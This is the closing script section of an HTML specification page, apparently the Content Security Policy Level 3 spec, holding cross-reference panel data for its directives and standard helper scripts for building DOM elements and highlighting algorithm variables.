        window.dfnpanelData['style-src-attr'] = { "dfnID": "style-src-attr", "url": "#style-src-attr", "dfnText": "style-src-attr", "refSections": [{ "refs": [{ "id": "ref-for-style-src-attr" }, { "id": "ref-for-style-src-attr\u2460" }], "title": "6.1.3. default-src" }, { "refs": [{ "id": "ref-for-style-src-attr\u2461" }], "title": "10.1. \n    Directive Registry\n  " }], "external": false };
        window.dfnpanelData['webrtc'] = { "dfnID": "webrtc", "url": "#webrtc", "dfnText": "webrtc", "refSections": [{ "refs": [{ "id": "ref-for-webrtc" }], "title": "6.2.1. webrtc" }], "external": false };
        window.dfnpanelData['grammardef-allow'] = { "dfnID": "grammardef-allow", "url": "#grammardef-allow", "dfnText": "'allow'", "refSections": [{ "refs": [{ "id": "ref-for-grammardef-allow" }], "title": "6.2.1.1. \n    webrtc Pre-connect Check\n  " }], "external": false };
        window.dfnpanelData['worker-src'] = { "dfnID": "worker-src", "url": "#worker-src", "dfnText": "worker-src", "refSections": [{ "refs": [{ "id": "ref-for-worker-src" }, { "id": "ref-for-worker-src\u2460" }], "title": "6.1.3. default-src" }, { "refs": [{ "id": "ref-for-worker-src\u2461" }], "title": "6.1.10. script-src" }, { "refs": [{ "id": "ref-for-worker-src\u2462" }], "title": "6.2.2. worker-src" }, { "refs": [{ "id": "ref-for-worker-src\u2463" }], "title": "10.1. \n    Directive Registry\n  " }], "external": false };
        window.dfnpanelData['base-uri'] = { "dfnID": "base-uri", "url": "#base-uri", "dfnText": "base-uri", "refSections": [{ "refs": [{ "id": "ref-for-base-uri" }], "title": "6.3.1.1. \n    Is base allowed for document?\n  " }, { "refs": [{ "id": "ref-for-base-uri\u2460" }], "title": "7.3. Nonce Retargeting" }, { "refs": [{ "id": "ref-for-base-uri\u2461" }], "title": "10.1. \n    Directive Registry\n  " }], "external": false };
        window.dfnpanelData['allow-base-for-document'] = { "dfnID": "allow-base-for-document", "url": "#allow-base-for-document", "dfnText": "6.3.1.1. \n    Is base allowed for document?\n  ", "refSections": [{ "refs": [{ "id": "ref-for-allow-base-for-document" }], "title": "4.2. \n    Integration with HTML\n  " }, { "refs": [{ "id": "ref-for-allow-base-for-document" }], "title": "6.3.1.1. \n    Is base allowed for document?\n  " }], "external": false };
        window.dfnpanelData['sandbox'] = { "dfnID": "sandbox", "url": "#sandbox", "dfnText": "sandbox", "refSections": [{ "refs": [{ "id": "ref-for-sandbox" }], "title": "4.2. \n    Integration with HTML\n  " }, { "refs": [{ "id": "ref-for-sandbox\u2460" }, { "id": "ref-for-sandbox\u2461" }], "title": "6.3.2.1. \n    sandbox Initialization\n  " }, { "refs": [{ "id": "ref-for-sandbox\u2462" }], "title": "10.1. \n    Directive Registry\n  " }], "external": false };
        window.dfnpanelData['form-action'] = { "dfnID": "form-action", "url": "#form-action", "dfnText": "form-action", "refSections": [{ "refs": [{ "id": "ref-for-form-action" }], "title": "10.1. \n    Directive Registry\n  " }], "external": false };
        window.dfnpanelData['frame-ancestors'] = { "dfnID": "frame-ancestors", "url": "#frame-ancestors", "dfnText": "frame-ancestors", "refSections": [{ "refs": [{ "id": "ref-for-frame-ancestors" }, { "id": "ref-for-frame-ancestors\u2460" }], "title": "4.2.5. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-frame-ancestors\u2461" }], "title": "6.4.2.1. \n    frame-ancestors Navigation Response Check\n  " }, { "refs": [{ "id": "ref-for-frame-ancestors\u2462" }, { "id": "ref-for-frame-ancestors\u2463" }], "title": "6.4.2.2. \n    Relation to ``X-Frame-Options``\n  " }, { "refs": [{ "id": "ref-for-frame-ancestors\u2464" }], "title": "10.1. \n    Directive Registry\n  " }], "external": false };
        window.dfnpanelData['grammardef-ancestor-source-list'] = { "dfnID": "grammardef-ancestor-source-list", "url": "#grammardef-ancestor-source-list", "dfnText": "ancestor-source-list", "refSections": [{ "refs": [{ "id": "ref-for-grammardef-ancestor-source-list" }], "title": "6.4.2. frame-ancestors" }], "external": false };
        window.dfnpanelData['grammardef-ancestor-source'] = { "dfnID": "grammardef-ancestor-source", "url": "#grammardef-ancestor-source", "dfnText": "ancestor-source", "refSections": [{ "refs": [{ "id": "ref-for-grammardef-ancestor-source" }, { "id": "ref-for-grammardef-ancestor-source\u2460" }], "title": "6.4.2. frame-ancestors" }], "external": false };
        window.dfnpanelData['report-uri'] = { "dfnID": "report-uri", "url": "#report-uri", "dfnText": "report-uri", "refSections": [{ "refs": [{ "id": "ref-for-report-uri" }], "title": "5.3. \n    Obtain the deprecated serialization of violation\n  " }, { "refs": [{ "id": "ref-for-report-uri\u2460" }], "title": "5.5. \n    Report a violation\n  " }, { "refs": [{ "id": "ref-for-report-uri\u2461" }, { "id": "ref-for-report-uri\u2462" }], "title": "6.5.1. report-uri" }, { "refs": [{ "id": "ref-for-report-uri\u2463" }], "title": "10.1. \n    Directive Registry\n  " }], "external": false };
        window.dfnpanelData['report-to'] = { "dfnID": "report-to", "url": "#report-to", "dfnText": "report-to", "refSections": [{ "refs": [{ "id": "ref-for-report-to" }], "title": "5.3. \n    Obtain the deprecated serialization of violation\n  " }, { "refs": [{ "id": "ref-for-report-to\u2460" }, { "id": "ref-for-report-to\u2461" }], "title": "5.5. \n    Report a violation\n  " }, { "refs": [{ "id": "ref-for-report-to\u2462" }, { "id": "ref-for-report-to\u2463" }], "title": "6.5.1. report-uri" }, { "refs": [{ "id": "ref-for-report-to\u2464" }], "title": "10.1. \n    Directive Registry\n  " }], "external": false };
        window.dfnpanelData['match-url-to-source-expression'] = { "dfnID": "match-url-to-source-expression", "url": "#match-url-to-source-expression", "dfnText": "6.7.2.8. \n    Does url match expression in origin with redirect count?\n  ", "refSections": [{ "refs": [{ "id": "ref-for-match-url-to-source-expression" }], "title": "1.3. Changes from Level 2" }, { "refs": [{ "id": "ref-for-match-url-to-source-expression" }], "title": "6.7.2.7. \n    Does url match source list in origin with redirect count?\n  " }, { "refs": [{ "id": "ref-for-match-url-to-source-expression" }], "title": "6.7.2.8. \n    Does url match expression in origin with redirect count?\n  " }], "external": false };
        window.dfnpanelData['scheme-part-match'] = { "dfnID": "scheme-part-match", "url": "#scheme-part-match", "dfnText": "scheme-part matches", "refSections": [{ "refs": [{ "id": "ref-for-scheme-part-match" }, { "id": "ref-for-scheme-part-match\u2460" }], "title": "6.7.2.8. \n    Does url match expression in origin with redirect count?\n  " }, { "refs": [{ "id": "ref-for-scheme-part-match\u2461" }, { "id": "ref-for-scheme-part-match\u2462" }], "title": "6.7.2.9. \n    scheme-part matching\n  " }], "external": false };
        window.dfnpanelData['host-part-match'] = { "dfnID": "host-part-match", "url": "#host-part-match", "dfnText": "host-part matches", "refSections": [{ "refs": [{ "id": "ref-for-host-part-match" }], "title": "6.7.2.8. \n    Does url match expression in origin with redirect count?\n  " }, { "refs": [{ "id": "ref-for-host-part-match\u2460" }, { "id": "ref-for-host-part-match\u2461" }, { "id": "ref-for-host-part-match\u2462" }, { "id": "ref-for-host-part-match\u2463" }], "title": "6.7.2.10. \n    host-part matching\n  " }], "external": false };
        window.dfnpanelData['port-part-matches'] = { "dfnID": "port-part-matches", "url": "#port-part-matches", "dfnText": "port-part matches", "refSections": [{ "refs": [{ "id": "ref-for-port-part-matches" }], "title": "6.7.2.8. \n    Does url match expression in origin with redirect count?\n  " }, { "refs": [{ "id": "ref-for-port-part-matches\u2460" }], "title": "6.7.2.11. \n    port-part matching\n  " }], "external": false };
        window.dfnpanelData['path-part-match'] = { "dfnID": "path-part-match", "url": "#path-part-match", "dfnText": "path-part matches", "refSections": [{ "refs": [{ "id": "ref-for-path-part-match" }], "title": "6.7.2.8. \n    Does url match expression in origin with redirect count?\n  " }, { "refs": [{ "id": "ref-for-path-part-match\u2460" }], "title": "6.7.2.12. \n    path-part matching\n  " }], "external": false };
        window.dfnpanelData['source-list-allows-all-inline-behavior'] = { "dfnID": "source-list-allows-all-inline-behavior", "url": "#source-list-allows-all-inline-behavior", "dfnText": "allows all inline behavior", "refSections": [{ "refs": [{ "id": "ref-for-source-list-allows-all-inline-behavior" }, { "id": "ref-for-source-list-allows-all-inline-behavior\u2460" }, { "id": "ref-for-source-list-allows-all-inline-behavior\u2461" }, { "id": "ref-for-source-list-allows-all-inline-behavior\u2462" }], "title": "6.7.3.2. \n    Does a source list allow all inline behavior for type?\n  " }], "external": false };
        window.dfnpanelData['request-effective-directive'] = { "dfnID": "request-effective-directive", "url": "#request-effective-directive", "dfnText": "effective directive", "refSections": [{ "refs": [{ "id": "ref-for-request-effective-directive" }], "title": "6.8.2. \n    Get the effective directive for inline checks\n  " }], "external": false };
    </script>
    <script>/* Boilerplate: script-dom-helper */
        function query(sel) { return document.querySelector(sel); }

        function queryAll(sel) { return [...document.querySelectorAll(sel)]; }

        function iter(obj) {
            if (!obj) return [];
            var it = obj[Symbol.iterator];
            if (it) return it;
            return Object.entries(obj);
        }

        function mk(tagname, attrs, ...children) {
            const el = document.createElement(tagname);
            for (const [k, v] of iter(attrs)) {
                if (k.slice(0, 3) == "_on") {
                    const eventName = k.slice(3);
                    el.addEventListener(eventName, v);
                } else if (k[0] == "_") {
                    // property, not attribute
                    el[k.slice(1)] = v;
                } else {
                    if (v === false || v == null) {
                        continue;
                    } else if (v === true) {
                        el.setAttribute(k, "");
                        continue;
                    } else {
                        el.setAttribute(k, v);
                    }
                }
            }
            append(el, children);
            return el;
        }

        /* Create shortcuts for every known HTML element */
        [
            "a",
            "abbr",
            "acronym",
            "address",
            "applet",
            "area",
            "article",
            "aside",
            "audio",
            "b",
            "base",
            "basefont",
            "bdo",
            "big",
            "blockquote",
            "body",
            "br",
            "button",
            "canvas",
            "caption",
            "center",
            "cite",
            "code",
            "col",
            "colgroup",
            "datalist",
            "dd",
            "del",
            "details",
            "dfn",
            "dialog",
            "div",
            "dl",
            "dt",
            "em",
            "embed",
            "fieldset",
            "figcaption",
            "figure",
            "font",
            "footer",
            "form",
            "frame",
            "frameset",
            "head",
            "header",
            "h1",
            "h2",
            "h3",
            "h4",
            "h5",
            "h6",
            "hr",
            "html",
            "i",
            "iframe",
            "img",
            "input",
            "ins",
            "kbd",
            "label",
            "legend",
            "li",
            "link",
            "main",
            "map",
            "mark",
            "meta",
            "meter",
            "nav",
            "nobr",
            "noscript",
            "object",
            "ol",
            "optgroup",
            "option",
            "output",
            "p",
            "param",
            "pre",
            "progress",
            "q",
            "s",
            "samp",
            "script",
            "section",
            "select",
            "small",
            "source",
            "span",
            "strike",
            "strong",
            "style",
            "sub",
            "summary",
            "sup",
            "table",
            "tbody",
            "td",
            "template",
            "textarea",
            "tfoot",
            "th",
            "thead",
            "time",
            "title",
            "tr",
            "u",
            "ul",
            "var",
            "video",
            "wbr",
            "xmp",
        ].forEach(tagname => {
            mk[tagname] = (...args) => mk(tagname, ...args);
        });

        function* nodesFromChildList(children) {
            for (const child of children.flat(Infinity)) {
                if (child instanceof Node) {
                    yield child;
                } else {
                    yield new Text(child);
                }
            }
        }
        function append(el, ...children) {
            for (const child of nodesFromChildList(children)) {
                if (el instanceof Node) el.appendChild(child);
                else el.push(child);
            }
            return el;
        }

        function insertAfter(el, ...children) {
            for (const child of nodesFromChildList(children)) {
                el.parentNode.insertBefore(child, el.nextSibling);
            }
            return el;
        }

        function clearContents(el) {
            el.innerHTML = "";
            return el;
        }

        function parseHTML(markup) {
            if (markup.toLowerCase().trim().indexOf('<!doctype') === 0) {
                const doc = document.implementation.createHTMLDocument("");
                doc.documentElement.innerHTML = markup;
                return doc;
            } else {
                const el = mk.template({});
                el.innerHTML = markup;
                return el.content;
            }
        }
    </script>
    <script>/* Boilerplate: script-var-click-highlighting */
        /*
        Color-choosing design:
        
        Colors are ordered by goodness.
        Each color has a usage count (initially zero).
        Each variable has a last-used color.
        
        * If the var has a last-used color, and that color's usage is 0,
            return that color.
        * Otherwise, return the lowest-indexed color with the lowest usage.
            Increment the color's usage and set it as the last-used color
            for that var.
        * On unclicking, decrement usage of the color.
        */
        "use strict";
        {
            document.addEventListener("click", e => {
                if (e.target.nodeName == "VAR") {
                    highlightSameAlgoVars(e.target);
                }
            });
            const indexCounts = new Map();
            const indexNames = new Map();
            function highlightSameAlgoVars(v) {
                // Find the algorithm container.
                let algoContainer = null;
                let searchEl = v;
                while (algoContainer == null && searchEl != document.body) {
                    searchEl = searchEl.parentNode;
                    if (searchEl.hasAttribute("data-algorithm")) {
                        algoContainer = searchEl;
                    }
                }

                // Not highlighting document-global vars,
                // too likely to be unrelated.
                if (algoContainer == null) return;

                const algoName = algoContainer.getAttribute("data-algorithm");
                const varName = getVarName(v);
                const addClass = !v.classList.contains("selected");
                let highlightClass = null;
                if (addClass) {
                    const index = chooseHighlightIndex(algoName, varName);
                    indexCounts.get(algoName)[index] += 1;
                    indexNames.set(algoName + "///" + varName, index);
                    highlightClass = nameFromIndex(index);
                } else {
                    const index = previousHighlightIndex(algoName, varName);
                    indexCounts.get(algoName)[index] -= 1;
                    highlightClass = nameFromIndex(index);
                }

                // Find all same-name vars, and toggle their class appropriately.
                for (const el of algoContainer.querySelectorAll("var")) {
                    if (getVarName(el) == varName) {
                        el.classList.toggle("selected", addClass);
                        el.classList.toggle(highlightClass, addClass);
                    }
                }
            }
            function getVarName(el) {
                return el.textContent.replace(/(\s|\xa0)+/, " ").trim();
            }
            function chooseHighlightIndex(algoName, varName) {
                let indexes = null;
                if (indexCounts.has(algoName)) {
                    indexes = indexCounts.get(algoName);
                } else {
                    // 7 classes right now
                    indexes = [0, 0, 0, 0, 0, 0, 0];
                    indexCounts.set(algoName, indexes);
                }

                // If the element was recently unclicked,
                // *and* that color is still unclaimed,
                // give it back the same color.
                const lastIndex = previousHighlightIndex(algoName, varName);
                if (indexes[lastIndex] === 0) return lastIndex;

                // Find the earliest index with the lowest count.
                const minCount = Math.min.apply(null, indexes);
                let index = null;
                for (var i = 0; i < indexes.length; i++) {
                    if (indexes[i] == minCount) {
                        return i;
                    }
                }
            }
            function previousHighlightIndex(algoName, varName) {
                return indexNames.get(algoName + "///" + varName);
            }
            function nameFromIndex(index) {
                return "selected" + index;
            }
        }
    </script>
    <script src="/dropdown.js"></script>